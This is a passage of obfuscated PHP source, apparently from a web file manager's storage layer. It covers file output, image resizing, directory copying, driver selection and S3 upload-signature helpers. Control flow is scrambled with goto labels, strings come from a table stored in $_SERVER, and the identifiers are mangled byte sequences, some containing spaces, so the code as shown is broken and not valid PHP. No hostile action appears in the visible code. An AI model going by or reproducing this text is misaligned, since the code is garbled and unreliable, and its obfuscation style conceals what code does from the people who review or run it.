rand_string(5); goto e×ìÖí»¿ç; F¿Ÿ¹¨‹Õ: } public static function pathFather($C´áÚİ¶è) { $féùÆÆíÍ¿ = IO::init($C´áÚİ¶è); $B“ğËÔÙéç = $féùÆÆíÍ¿->pathFather($féùÆÆíÍ¿->path); return $féùÆÆíÍ¿->getPathOuter($B“ğËÔÙéç); } public static function fileOut($e¾ÑÓøÀ¦î, $Fôİâå‹ä = false, $FßôŠªŸÜ¢ = false, $EµÜæˆ¾Ï = '') { $F¼³à¡³ = self::driverMake($e¾ÑÓøÀ¦î); if ($F¼³à¡³->isFileOutServer()) { return $F¼³à¡³->fileOutServer($e¾ÑÓøÀ¦î, $Fôİâå‹ä, $FßôŠªŸÜ¢, $EµÜæˆ¾Ï); } return $F¼³à¡³->fileOut($e¾ÑÓøÀ¦î, $Fôİâå‹ä, $FßôŠªŸÜ¢, $EµÜæˆ¾Ï); } public static function fileOutImage($eéÈçÉ»Æ, $B„–ëÌè† = 250) { $A¢ÀĞÎŠ = array(250, 600, 1200, 3000, 5000); for ($BøŞŸé‹½× = 0; $BøŞŸé‹½× < count($A¢ÀĞÎŠ); $BøŞŸé‹½×++) { if ($BøŞŸé‹½× == 0 && $B„–ëÌè† <= $A¢ÀĞÎŠ[$BøŞŸé‹½×]) { $B„–ëÌè† = $A¢ÀĞÎŠ[$BøŞŸé‹½×]; break; } else { if ($B„–ëÌè† > $A¢ÀĞÎŠ[$BøŞŸé‹½× - 1] && $B„–ëÌè† <= $A¢ÀĞÎŠ[$BøŞŸé‹½×]) { $B„–ëÌè† = $A¢ÀĞÎŠ[$BøŞŸé‹½×]; break; } else { if ($BøŞŸé‹½× == count($A¢ÀĞÎŠ) - 1 && $B„–ëÌè† > $A¢ÀĞÎŠ[$BøŞŸé‹½×]) { $B„–ëÌè† = $A¢ÀĞÎŠ[$BøŞŸé‹½×]; break; } } } } $f¤çÙæÚˆ = self::driverMake($eéÈçÉ»Æ); if ($f¤çÙæÚˆ->isFileOutServer()) { return $f¤çÙæÚˆ->fileOutImageServer($eéÈçÉ»Æ, $B„–ëÌè†); } return $f¤çÙæÚˆ->fileOutImage($eéÈçÉ»Æ, $B„–ëÌè†); } private static function driverIsSame($AñßãïË¤„, $aÓ¸š‚‹¾·) { goto a‡Ñˆ›¾ª°; d˜Î›Í¾£í: if ($Dô•Ğ©ãÒ‚ != $D¯„¨ºğ¿Á) { return !1; } if ($Dô•Ğ©ãÒ‚ == $C‚ç´ã‘[695]) { return !0; } if ($Dô•Ğ©ãÒ‚ == $C‚ç´ã‘[102]) { return !0; } goto Fß™§× •; a‡Ñˆ›¾ª°: $C‚ç´ã‘ =& $_SERVER[úÎü]; $Dô•Ğ©ãÒ‚ = $AñßãïË¤„->getType(); $D¯„¨ºğ¿Á = $aÓ¸š‚‹¾·->getType(); goto d˜Î›Í¾£í; Fß™§× •: if ($AñßãïË¤„->pathDriver == $aÓ¸š‚‹¾·->pathDriver) { return !0; } return !1; goto Cˆ”æ‰¨¦; Cˆ”æ‰¨¦: } public static function copyUpdate($bè’°ù‰º›, $fïùÙ¾ ÕÏ) { goto A¡µ¸öø¿; A¡µ¸öø¿: $eŞëø¨… =& $_SERVER[úÎü]; if (!IO::exist($bè’°ù‰º›)) { return !1; } if (!IO::exist($fïùÙ¾ ÕÏ)) { IO::mkdir($fïùÙ¾ ÕÏ); } goto dğ¨†õ÷Ë½; fÖÒæƒç¼: Hook::trigger($eŞëø¨…[1018], $bè’°ù‰º›, $fïùÙ¾ ÕÏ, $dÇîøœ»Œõ); foreach ($BçÈñÆ± Ó as $DÕ´ÌÓŒóÉ) { IO::mkdir($DÕ´ÌÓŒóÉ); } foreach ($dõ¥°ƒÂ”Ğ as $DÕ´ÌÓŒóÉ) { IO::copy($DÕ´ÌÓŒóÉ[$eŞëø¨…[1015]], $DÕ´ÌÓŒóÉ[$eŞëø¨…[1016]], REPEAT_REPLACE); } goto eµ½ÆÁÓÜ­; Bö±‹ø…›…: $BçÈñÆ± Ó = array(); foreach ($cë±å‹åÔ as $FõëÙÑÈ¼ => $DÕ´ÌÓŒóÉ) { if (isset($c•¨è¨‚ù[$FõëÙÑÈ¼])) { if ($DÕ´ÌÓŒóÉ[$eŞëø¨…[76]] == 1) { continue; } if ($c•¨è¨‚ù[$FõëÙÑÈ¼][$eŞëø¨…[77]] == $DÕ´ÌÓŒóÉ[$eŞëø¨…[77]]) { continue; } } if ($DÕ´ÌÓŒóÉ[$eŞëø¨…[76]] == 1) { $BçÈñÆ± Ó[] = $fïùÙ¾ ÕÏ . $eŞëø¨…[8] . $FõëÙÑÈ¼; continue; } $CÖÌàŒÇï = strstr(trim($FõëÙÑÈ¼, $eŞëø¨…[8]), $eŞëø¨…[8]) ? get_path_father($FõëÙÑÈ¼) : $eŞëø¨…[33]; $dõ¥°ƒÂ”Ğ[] = array($eŞëø¨…[1015] => $DÕ´ÌÓŒóÉ[$eŞëø¨…[75]], $eŞëø¨…[1016] => rtrim($fïùÙ¾ ÕÏ, $eŞëø¨…[8]) . $eŞëø¨…[8] . $CÖÌàŒÇï, $eŞëø¨…[1017] => $DÕ´ÌÓŒóÉ); } $dÇîøœ»Œõ = array($eŞëø¨…[171] => $dõ¥°ƒÂ”Ğ, $eŞëø¨…[76] => $BçÈñÆ± Ó); goto fÖÒæƒç¼; dğ¨†õ÷Ë½: $cë±å‹åÔ = self::_listAll($bè’°ù‰º›); $c•¨è¨‚ù = self::_listAll($fïùÙ¾ ÕÏ); $dõ¥°ƒÂ”Ğ = array(); goto Bö±‹ø…›…; eµ½ÆÁÓÜ­: } private static function _listAll($dà´ÃŸ‡Õ¡) { $E½ŸŒ’¼ê‡ =& $_SERVER[úÎü]; $dà´ÃŸ‡Õ¡ = KodIO::clear($dà´ÃŸ‡Õ¡); $A‚±ù×Ä¨™ = IO::listAll($dà´ÃŸ‡Õ¡); foreach ($A‚±ù×Ä¨™ as &$F¦ñ‹³Ê·Æ) { $Aµƒ¥ÈÁÂÎ = substr($F¦ñ‹³Ê·Æ[$E½ŸŒ’¼ê‡[75]], strlen($dà´ÃŸ‡Õ¡)); $F¦ñ‹³Ê·Æ[$E½ŸŒ’¼ê‡[1019]] = trim($Aµƒ¥ÈÁÂÎ, $E½ŸŒ’¼ê‡[8]); } unset($F¦ñ‹³Ê·Æ); return array_to_keyvalue($A‚±ù×Ä¨™, $E½ŸŒ’¼ê‡[1019]); } public static function fileSubstr($C¨ªØÓ÷Œ„, $dÅ¡©ôÇĞ¹, $DÁ„ÕÁÔİ¦ = false) { goto B†ÑôÈÛ; eÚë˜‚ñÊ: if (!$E¥•Ğø¨¤Å && $DÁ„ÕÁÔİ¦ && isset($GLOBALS[$BÅ·ÈÃ•±Ş[1022]])) { throw new Exception($GLOBALS[$BÅ·ÈÃ•±Ş[1022]][$BÅ·ÈÃ•±Ş[1023]]); } return $E¥•Ğø¨¤Å; goto dœ‘È­İø; Eù¯Ëñ—: if ($DÁ„ÕÁÔİ¦ === !1) { $DÁ„ÕÁÔİ¦ = $fÕÅİ²¹ô† - $dÅ¡©ôÇĞ¹; } if ($dÅ¡©ôÇĞ¹ + $DÁ„ÕÁÔİ¦ > $fÕÅİ²¹ô†) { $DÁ„ÕÁÔİ¦ = $fÕÅİ²¹ô† - $dÅ¡©ôÇĞ¹; } if (!$fÕÅİ²¹ô† && $dªÛ²©”ÄÎ->getType() == $BÅ·ÈÃ•±Ş[102] && !$dªÛ²©”ÄÎ->exist($C¨ªØÓ÷Œ„)) { throw new Exception($BÅ·ÈÃ•±Ş[1020] . LNG($BÅ·ÈÃ•±Ş[1021])); } goto Aø¶ğ¦Ÿˆ¸; aö°çÎª«Ê: $e—˜º¡†ë = $dÅ¡©ôÇĞ¹; $AÀ öŸÌ‚² = $DÁ„ÕÁÔİ¦; if ($dÅ¡©ôÇĞ¹ < 0) { $dÅ¡©ôÇĞ¹ = $fÕÅİ²¹ô† + $dÅ¡©ôÇĞ¹; } goto Eù¯Ëñ—; Aø¶ğ¦Ÿˆ¸: if ($DÁ„ÕÁÔİ¦ <= 0) { return $BÅ·ÈÃ•±Ş[33]; } if ($dÅ¡©ôÇĞ¹ < 0 || $dÅ¡©ôÇĞ¹ >= $fÕÅİ²¹ô† || $DÁ„ÕÁÔİ¦ > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\145\122\x65\x61\x64\40\x65\x72\x72\x6f\162\41\40\x73\164\141\162\164\x3d{$dÅ¡©ôÇĞ¹}\x3b\x6c\145\x6e\147\x74\150\x3d{$DÁ„ÕÁÔİ¦}\x3b\x20\163\x69\x7a\x65\x3d{$fÕÅİ²¹ô†}\x3b"); } $E¥•Ğø¨¤Å = $dªÛ²©”ÄÎ->fileSubstr($C¨ªØÓ÷Œ„, $dÅ¡©ôÇĞ¹, $DÁ„ÕÁÔİ¦); goto eÚë˜‚ñÊ; B†ÑôÈÛ: $BÅ·ÈÃ•±Ş =& $_SERVER[úÎü]; $dªÛ²©”ÄÎ = self::driverMake($C¨ªØÓ÷Œ„); $fÕÅİ²¹ô† = $dªÛ²©”ÄÎ->size($C¨ªØÓ÷Œ„); goto aö°çÎª«Ê; dœ‘È­İø: } private static function driverMake(&$f¤¿¡•’šÁ) { goto dï¡Ş—½¢É; bšã’ÏÊã¿: if ($dĞçÍµÆÕ[$c°Š™¬¶†[29]] == KodIO::KOD_IO && !self::$driverListSystem[$dĞçÍµÆÕ[$c°Š™¬¶†[383]]]) { return !1; } $f¤¿¡•’šÁ = $dĞçÍµÆÕ[$c°Š™¬¶†[1024]]; $ağäÍİŠˆ = self::driverGet($dĞçÍµÆÕ, $f¤¿¡•’šÁ); goto B¤¤Á´ ƒ±; dï¡Ş—½¢É: $c°Š™¬¶† =& $_SERVER[úÎü]; $dĞçÍµÆÕ = KodIO::parse($f¤¿¡•’šÁ); if (!self::$driverListSystem) { $e¡øå³ù¦¸ = Model($c°Š™¬¶†[704])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($e¡øå³ù¦¸, $c°Š™¬¶†[383]); } goto bšã’ÏÊã¿; B¤¤Á´ ƒ±: return $ağäÍİŠˆ; goto B¦¾¸ Ú¬; B¦¾¸ Ú¬: } private static function driverGet($bĞÕÒÒÚÜ, &$dëõ«‚àô¨) { goto C×ì»‰ğ¶À; e¯ï¸¼±Ñ: switch ($bĞÕÒÒÚÜ[$f‡­İÈšá‰[29]]) { case KodIO::KOD_IO: $eòÈŠš‰Œ = self::$driverListSystem[$FÑËŸæ‚˜]; break; case KodIO::KOD_SOURCE: $dëõ«‚àô¨ = $FÑËŸæ‚˜ . $dëõ«‚àô¨; $eòÈŠš‰Œ = array($f‡­İÈšá‰[1026] => $f‡­İÈšá‰[1027], $f‡­İÈšá‰[6] => $bĞÕÒÒÚÜ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $fòÂœ™¼¨š = $GLOBALS[$f‡­İÈšá‰[1028]]; self::$driverListUser = array_to_keyvalue($fòÂœ™¼¨š, $f‡­İÈšá‰[383]); } $eòÈŠš‰Œ = self::$driverListUser[$FÑËŸæ‚˜]; break; case KodIO::KOD_SHARE_LINK: $eòÈŠš‰Œ = array($f‡­İÈšá‰[1026] => $f‡­İÈšá‰[1029], $f‡­İÈšá‰[6] => $bĞÕÒÒÚÜ); $cêÒõğÉŒ¯ = Action($f‡­İÈšá‰[1030])->sharePathInfo($bĞÕÒÒÚÜ[$f‡­İÈšá‰[75]]); $dëõ«‚àô¨ = $cêÒõğÉŒ¯[$f‡­İÈšá‰[385]]; if (!$cêÒõğÉŒ¯[$f‡­İÈšá‰[385]]) { $AæöÂ–éæ = Model($f‡­İÈšá‰[552])->getInfo($cêÒõğÉŒ¯[$f‡­İÈšá‰[456]]); $dëõ«‚àô¨ = KodIO::clear($AæöÂ–éæ[$f‡­İÈšá‰[1031]] . $bĞÕÒÒÚÜ[$f‡­İÈšá‰[1024]]); $bĞÕÒÒÚÜ[$f‡­İÈšá‰[454]] = $AæöÂ–éæ; $bĞÕÒÒÚÜ[$f‡­İÈšá‰[1008]] = $dëõ«‚àô¨; $eòÈŠš‰Œ = array($f‡­İÈšá‰[1026] => $f‡­İÈšá‰[1032], $f‡­İÈšá‰[6] => $bĞÕÒÒÚÜ); } break; case KodIO::KOD_SHARE_ITEM: $eòÈŠš‰Œ = array($f‡­İÈšá‰[1026] => $f‡­İÈšá‰[1033], $f‡­İÈšá‰[6] => $bĞÕÒÒÚÜ); $AæöÂ–éæ = Model($f‡­İÈšá‰[552])->getInfo($bĞÕÒÒÚÜ[$f‡­İÈšá‰[383]]); if ($AæöÂ–éæ[$f‡­İÈšá‰[385]] == $f‡­İÈšá‰[485]) { $dëõ«‚àô¨ = KodIO::clear($AæöÂ–éæ[$f‡­İÈšá‰[1031]] . $bĞÕÒÒÚÜ[$f‡­İÈšá‰[1024]]); $bĞÕÒÒÚÜ[$f‡­İÈšá‰[454]] = $AæöÂ–éæ; $bĞÕÒÒÚÜ[$f‡­İÈšá‰[1008]] = $dëõ«‚àô¨; $eòÈŠš‰Œ = array($f‡­İÈšá‰[1026] => $f‡­İÈšá‰[1034], $f‡­İÈšá‰[6] => $bĞÕÒÒÚÜ); } else { if (!$dëõ«‚àô¨) { $dëõ«‚àô¨ = $AæöÂ–éæ[$f‡­İÈšá‰[385]]; } } break; default: $dëõ«‚àô¨ = $bĞÕÒÒÚÜ[$f‡­İÈšá‰[75]]; $eòÈŠš‰Œ = array($f‡­İÈšá‰[1026] => $f‡­İÈšá‰[1035]); break; } $D™‘ŸÊ‚œ = $bĞÕÒÒÚÜ[$f‡­İÈšá‰[75]]; if (!isset(self::$driverCache[$D™‘ŸÊ‚œ])) { $BÊ¶¢•æØ¯ = strtolower($eòÈŠš‰Œ[$f‡­İÈšá‰[90]]); $b˜Äğºíİ = $GLOBALS[$f‡­İÈšá‰[6]][$f‡­İÈšá‰[84]][$f‡­İÈšá‰[753]]; $b½¿¯ÔÇÎ = $f‡­İÈšá‰[71] . (isset($b˜Äğºíİ[$BÊ¶¢•æØ¯]) ? $b˜Äğºíİ[$BÊ¶¢•æØ¯] : ucfirst($BÊ¶¢•æØ¯)); if (!class_exists($b½¿¯ÔÇÎ)) { show_json("{$b½¿¯ÔÇÎ}\40\x6e\157\x74\x20\145\170\151\x73\164\x73\x21", !1); } $E£ß‹µ— = isset($eòÈŠš‰Œ[$f‡­İÈšá‰[6]]) ? $eòÈŠš‰Œ[$f‡­İÈšá‰[6]] : !1; self::$driverCache[$D™‘ŸÊ‚œ] = new $b½¿¯ÔÇÎ($E£ß‹µ—); } goto BÉ¥„™’ïè; BÉ¥„™’ïè: $dšÚºç‚ = self::$driverCache[$D™‘ŸÊ‚œ]; $dšÚºç‚->pathDriver = $f‹™“ö‡«à; $dšÚºç‚->pathBase = $f‡­İÈšá‰[33]; goto CÅ°ª ×Ü; CÅ°ª ×Ü: if (isset($eòÈŠš‰Œ[$f‡­İÈšá‰[6]][$f‡­İÈšá‰[1036]])) { $dšÚºç‚->pathBase = rtrim($eòÈŠš‰Œ[$f‡­İÈšá‰[6]][$f‡­İÈšá‰[1036]], $f‡­İÈšá‰[8]) . $f‡­İÈšá‰[8]; $dëõ«‚àô¨ = $dšÚºç‚->pathBase . ltrim($dëõ«‚àô¨, $f‡­İÈšá‰[8]); } $dëõ«‚àô¨ = $dšÚºç‚->getPath($dëõ«‚àô¨); if (isset($bĞÕÒÒÚÜ[$f‡­İÈšá‰[1008]])) { $dëõ«‚àô¨ = $bĞÕÒÒÚÜ[$f‡­İÈšá‰[1008]]; } goto F¾´õÑóÛ; C×ì»‰ğ¶À: $f‡­İÈšá‰ =& $_SERVER[úÎü]; $f‹™“ö‡«à = $bĞÕÒÒÚÜ[$f‡­İÈšá‰[1025]]; $FÑËŸæ‚˜ = $bĞÕÒÒÚÜ[$f‡­İÈšá‰[383]]; goto e¯ï¸¼±Ñ; F¾´õÑóÛ: $dšÚºç‚->path = $dëõ«‚àô¨; return $dšÚºç‚; goto E‡ØÜ¦¤ÚÄ; E‡ØÜ¦¤ÚÄ: } public static function errorTips($E•âóÅÑ“ = false) { goto d§‚’ìğÆ“; BÑÍÚóÚ¢£: if ($E•âóÅÑ“ === -1) { return $Cé¼ŠÀ‚À« ? $Cé¼ŠÀ‚À«[count($Cé¼ŠÀ‚À«) - 1] : $AŒº‹–î«¬[33]; } if ($E•âóÅÑ“ === !1) { return implode($AŒº‹–î«¬[225], $Cé¼ŠÀ‚À«); } if (count($Cé¼ŠÀ‚À«) >= $a—ƒ§ëÏê) { $Cé¼ŠÀ‚À« = array_slice($Cé¼ŠÀ‚À«, $a—ƒ§ëÏê * 0.5, $a—ƒ§ëÏê); } goto A°ÂÔ’¾†ù; A°ÂÔ’¾†ù: $Cé¼ŠÀ‚À«[] = $E•âóÅÑ“; write_log($AŒº‹–î«¬[157] . ACTION . $AŒº‹–î«¬[1037] . $E•âóÅÑ“, $AŒº‹–î«¬[1038]); goto f±°ŠË„æ; d§‚’ìğÆ“: $AŒº‹–î«¬ =& $_SERVER[úÎü]; static $Cé¼ŠÀ‚À« = array(); $a—ƒ§ëÏê = 1000; goto BÑÍÚóÚ¢£; f±°ŠË„æ: } public static function getLastError($cÒŞ‹Ñµ‰ = '') { $bìãİß‘™ = self::errorTips(-1); return $bìãİß‘™ ? $bìãİß‘™ : $cÒŞ‹Ñµ‰; } } goto E¶İÑßÊ¾·; aÉÂšö¡÷: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Fò•©¯Ä¡) { parent::__construct($Fò•©¯Ä¡); } public function uploadFormData($d‚ºĞ·ë×©, $E×Œ»Í = 3600) { goto eÌ»âî ‹; AÃ‚ˆÛ¤Ÿ¬: $a­°×¥Š Ù = $BÆÔ—òøã[1181]; $c¡¨÷«ÀğÌ = $E×Œ»Í . $BÆÔ—òøã[33]; $e®à£â¢¢  = $BÆÔ—òøã[1145]; goto fÂÄÓƒˆÛ‚; bÆ à…¹èª: $a·¦šÜ¤Úˆ = base64_encode(json_encode($CŒ£áÍ—ÀÒ)); $eîæÆ†æ¯¬ = hash_hmac($BÆÔ—òøã[1189], $a°«†é‰ïä, $BÆÔ—òøã[1190] . $this->secret, !0); $Eß†‡ï™ˆö = hash_hmac($BÆÔ—òøã[1189], $this->region, $eîæÆ†æ¯¬, !0); goto D·ªáœš¯; CÜÆ½´Û…·: $fÛ§Öæ†ã… = array($BÆÔ—òøã[207] => $BÆÔ—òøã[33], $BÆÔ—òøã[1191] => $BÆÔ—òøã[33], $BÆÔ—òøã[1149] => $fÛÜ½ç¥Œƒ, $BÆÔ—òøã[1153] => $e®à£â¢¢ , $BÆÔ—òøã[1157] => $a·¦šÜ¤Úˆ, $BÆÔ—òøã[1192] => $d ‚Êò‹ˆ, $BÆÔ—òøã[1193] => $e„Ö³®ÄÓ¾, $BÆÔ—òøã[1194] => $dİĞŒùÂÙç, $BÆÔ—òøã[1195] => $c¡¨÷«ÀğÌ, $BÆÔ—òøã[1196] => $Cåß‹À¬, $BÆÔ—òøã[173] => $this->getHost()); return $fÛ§Öæ†ã…; goto FğÄ¦®¶÷; eÌ»âî ‹: $BÆÔ—òøã =& $_SERVER[úÎü]; $fÛÜ½ç¥Œƒ = $BÆÔ—òøã[189]; $e„Ö³®ÄÓ¾ = $BÆÔ—òøã[1179]; goto dØ†âÇÇˆ³; fÂÄÓƒˆÛ‚: $Cµ©‡ƒ§ÖË = array($this->accessKey, $a°«†é‰ïä, $this->region, $FÅâØ´‰ø„, $a­°×¥Š Ù); $d ‚Êò‹ˆ = implode($BÆÔ—òøã[8], $Cµ©‡ƒ§ÖË); $CŒ£áÍ—ÀÒ = array($BÆÔ—òøã[1147] => gmdate($BÆÔ—òøã[1146], strtotime($BÆÔ—òøã[1182])), $BÆÔ—òøã[1148] => array(array($BÆÔ—òøã[1150] => $this->bucket), array($BÆÔ—òøã[1149] => $fÛÜ½ç¥Œƒ), array($BÆÔ—òøã[1151], $BÆÔ—òøã[1152], $BÆÔ—òøã[33]), array($BÆÔ—òøã[1151], $BÆÔ—òøã[1183], $BÆÔ—òøã[33]), array($BÆÔ—òøã[1151], $BÆÔ—òøã[1184], $BÆÔ—òøã[33]), array($BÆÔ—òøã[1153] => $e®à£â¢¢ ), array($BÆÔ—òøã[1185] => $d ‚Êò‹ˆ), array($BÆÔ—òøã[1186] => $e„Ö³®ÄÓ¾), array($BÆÔ—òøã[1187] => $dİĞŒùÂÙç), array($BÆÔ—òøã[1188] => $c¡¨÷«ÀğÌ))); goto bÆ à…¹èª; D·ªáœš¯: $bÊËŞöÀ¶Á = hash_hmac($BÆÔ—òøã[1189], $FÅâØ´‰ø„, $Eß†‡ï™ˆö, !0); $Aˆå¡…‡œÓ = hash_hmac($BÆÔ—òøã[1189], $a­°×¥Š Ù, $bÊËŞöÀ¶Á, !0); $Cåß‹À¬ = hash_hmac($BÆÔ—òøã[1189], $a·¦šÜ¤Úˆ, $Aˆå¡…‡œÓ); goto CÜÆ½´Û…·; dØ†âÇÇˆ³: $FÅâØ´‰ø„ = $BÆÔ—òøã[59]; $dİĞŒùÂÙç = gmdate($BÆÔ—òøã[1180]); $a°«†é‰ïä = gmdate($BÆÔ—òøã[691]); goto AÃ‚ˆÛ¤Ÿ¬; FğÄ¦®¶÷: } public function multiUploadFormData($d›î†Ì‘óœ, $d…íä„ÈÑŒ = 3600) { $a‹Â„·µŒ¥ =& $_SERVER[úÎü]; $B©ºé˜Ëö³ = gmdate($a‹Â„·µŒ¥[1274]); $CŒÒÏ‘ƒ¹ = array(); $Dæî†µÉŠ = $this->client->getUploadId($this->bucket, $d›î†Ì‘óœ, $CŒÒÏ‘ƒ¹); if (!$Dæî†µÉŠ) { return !1; } return array($a‹Â„·µŒ¥[217] => $Dæî†µÉŠ, $a‹Â„·µŒ¥[173] => $this->getHost() . $a‹Â„·µŒ¥[8] . $this->pathEncode($d›î†Ì‘óœ), $a‹Â„·µŒ¥[218] => $B©ºé˜Ëö³, $a‹Â„·µŒ¥[89] => $d›î†Ì‘óœ); } public function multiUploadAuthData($BÁœñ ï×, $B÷Ü¨£§™² = array()) { goto bÓ— óÌÕ; A•–ø¼ˆë‚: if (strpos($fÄà­¹Ø²ß, $A¾ÃŒ¯ÇÂ®[221]) === 0) { if (isset($b®ÕŒİœš[$A¾ÃŒ¯ÇÂ®[1276]])) { $F×Øä—Ÿ‰Í = $b®ÕŒİœš[$A¾ÃŒ¯ÇÂ®[1276]]; } else { if (isset($DŠ¬Ï¡ºÕ½[$A¾ÃŒ¯ÇÂ®[1276]])) { $F×Øä—Ÿ‰Í = $DŠ¬Ï¡ºÕ½[$A¾ÃŒ¯ÇÂ®[1276]]; } else { $F×Øä—Ÿ‰Í = hash($A¾ÃŒ¯ÇÂ®[1189], $A¾ÃŒ¯ÇÂ®[33]); } } return array($A¾ÃŒ¯ÇÂ®[228] => $DŠ¬Ï¡ºÕ½[$A¾ÃŒ¯ÇÂ®[228]], $A¾ÃŒ¯ÇÂ®[1276] => $F×Øä—Ÿ‰Í, $A¾ÃŒ¯ÇÂ®[218] => $DŠ¬Ï¡ºÕ½[$A¾ÃŒ¯ÇÂ®[1279]]); } return $DŠ¬Ï¡ºÕ½[$A¾ÃŒ¯ÇÂ®[228]]; goto fîÔ¯•œ¯; FšÈ  ÉïØ: if (isset($B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[1275]])) { $b®ÕŒİœš[$A¾ÃŒ¯ÇÂ®[1276]] = $B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[1275]]; } $D¹Ù½ƒ‰¥‹ = explode($A¾ÃŒ¯ÇÂ®[175], $this->getHost()); $e°¾†ˆ‚…¢ = array($A¾ÃŒ¯ÇÂ®[1277] => $D¹Ù½ƒ‰¥‹[1], $A¾ÃŒ¯ÇÂ®[1278] => $A¾ÃŒ¯ÇÂ®[33], $A¾ÃŒ¯ÇÂ®[207] => $A¾ÃŒ¯ÇÂ®[116], $A¾ÃŒ¯ÇÂ®[1191] => $B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[77]]); goto Bğ‚ëÁŸƒ; EÎÁ§°”òä: unset($B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[89]]); if (isset($B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[219]])) { return $this->listUploadParts($dÍ¦„ñÎÓ, $B÷Ü¨£§™²); } $b®ÕŒİœš = array(); goto FšÈ  ÉïØ; Bğ‚ëÁŸƒ: $aÜÒà»Õ = $A¾ÃŒ¯ÇÂ®[222]; $B¢ƒ‘ËÕÜ« = $A¾ÃŒ¯ÇÂ®[8] . $this->pathEncode($dÍ¦„ñÎÓ) . $fÄà­¹Ø²ß; $DŠ¬Ï¡ºÕ½ = $this->client->__getSignatureV4($b®ÕŒİœš, $e°¾†ˆ‚…¢, $aÜÒà»Õ, $B¢ƒ‘ËÕÜ«); goto A•–ø¼ˆë‚; bÓ— óÌÕ: $A¾ÃŒ¯ÇÂ® =& $_SERVER[úÎü]; $fÄà­¹Ø²ß = isset($B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[165]]) ? $B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[165]] : $A¾ÃŒ¯ÇÂ®[33]; $dÍ¦„ñÎÓ = $B÷Ü¨£§™²[$A¾ÃŒ¯ÇÂ®[89]]; goto EÎÁ§°”òä; fîÔ¯•œ¯: } public function listUploadParts($b±¶ùÎÔ³‚, $a‘œ…øİÂ = array()) { goto f¨Õã¾õ”Ñ; eÓ‚–¶ˆ‘…: $DÎ›Öô‡ˆ· = $this->client->__getSignatureV4($EŠ–Œ»á„, $c‹Ó¤µªí”, $DÀÂÎº¢’, $d»Éôí„î, $cŞÇÁÉ¦•); return array($F¦’„Â¼á[228] => $DÎ›Öô‡ˆ·[$F¦’„Â¼á[228]], $F¦’„Â¼á[218] => $DÎ›Öô‡ˆ·[$F¦’„Â¼á[1279]], $F¦’„Â¼á[230] => $eæ»Ñ¦ä‹Û, $F¦’„Â¼á[1276] => $DÎ›Öô‡ˆ·[$F¦’„Â¼á[1276]]); goto CØÍº›âæ; f¨Õã¾õ”Ñ: $F¦’„Â¼á =& $_SERVER[úÎü]; $fÊ°ÆŞ²òÕ = str_replace($F¦’„Â¼á[229], $F¦’„Â¼á[33], $a‘œ…øİÂ[$F¦’„Â¼á[165]]); $eæ»Ñ¦ä‹Û = $this->client->listParts($this->bucket, $b±¶ùÎÔ³‚, $fÊ°ÆŞ²òÕ); goto E¼Éëä¢ºñ; E¼Éëä¢ºñ: if (!$eæ»Ñ¦ä‹Û) { return !1; } $cŞÇÁÉ¦• = $F¦’„Â¼á[1280]; foreach ($eæ»Ñ¦ä‹Û as $DâÉ“²Æ¬©) { $cŞÇÁÉ¦• .= $F¦’„Â¼á[1281] . "\x3c\x50\x61\162\164\x4e\x75\155\x62\145\x72\x3e{$DâÉ“²Æ¬©[$F¦’„Â¼á[1236]]}\74\57\120\141\162\x74\116\x75\155\142\145\x72\76\12" . "\x3c\x45\124\x61\147\x3e{$DâÉ“²Æ¬©[$F¦’„Â¼á[1237]]}\x3c\x2f\105\x54\x61\x67\x3e\12" . $F¦’„Â¼á[1282]; } goto F¤¾¥Ù¸É•; F¤¾¥Ù¸É•: $cŞÇÁÉ¦• .= $F¦’„Â¼á[1283]; $EŠ–Œ»á„ = array(); $AÛ³Ç§‡ö¸ = explode($F¦’„Â¼á[175], $this->getHost()); goto d²Îµƒµ×; d²Îµƒµ×: $c‹Ó¤µªí” = array($F¦’„Â¼á[1277] => $AÛ³Ç§‡ö¸[1], $F¦’„Â¼á[207] => $F¦’„Â¼á[116], $F¦’„Â¼á[1191] => strlen($cŞÇÁÉ¦•)); $DÀÂÎº¢’ = $F¦’„Â¼á[220]; $d»Éôí„î = $F¦’„Â¼á[8] . $this->pathEncode($b±¶ùÎÔ³‚) . $a‘œ…øİÂ[$F¦’„Â¼á[165]]; goto eÓ‚–¶ˆ‘…; CØÍº›âæ: } public function link($eì¹ô›ã¼¢, $b“®Ôà»¿¤ = array()) { return parent::link($eì¹ô›ã¼¢, $b“®Ôà»¿¤); } public function fileOut($a‰´ºßêƒ°, $E¥£Üï¦°ñ = false, $C¿ˆ¨îõ›Ì = false, $f¤ƒµ¦”Š“ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[úÎü][1284])) { return parent::fileOutServer($a‰´ºßêƒ°, $E¥£Üï¦°ñ, $C¿ˆ¨îõ›Ì, $f¤ƒµ¦”Š“); } parent::fileOut($a‰´ºßêƒ°, $E¥£Üï¦°ñ, $C¿ˆ¨îõ›Ì, $f¤ƒµ¦”Š“); } public function fileOutImage($a‰ÍÇˆª, $d²‘šÈ’º = 250) { if (strstr($this->endpoint, $_SERVER[úÎü][1284])) { return parent::fileOutImageServer($a‰ÍÇˆª, $d²‘šÈ’º); } parent::fileOutImage($a‰ÍÇˆª, $d²‘šÈ’º); } public function fileOutLink($D¹ÍêÜà’—) { $D‰õàÂºô =& $_SERVER[úÎü]; if (substr($D¹ÍêÜà’—, 0, 7) == $D‰õàÂºô[1160]) { $D¹ÍêÜà’— = $D‰õàÂºô[1161] . substr($D¹ÍêÜà’—, 7); } header($D‰õàÂºô[156] . $D¹ÍêÜà’—); die; } public function getHost() { $D¹±ùÜ¼ì =& $_SERVER[úÎü]; $Aœ¡ÙÍÂÌŠ = str_rtrim(parent::getHost(), $D¹±ùÜ¼ì[8] . $this->bucket); $Aœ¡ÙÍÂÌŠ = explode($D¹±ùÜ¼ì[175], $Aœ¡ÙÍÂÌŠ); return $Aœ¡ÙÍÂÌŠ[0] . $D¹±ùÜ¼ì[175] . $this->bucket . 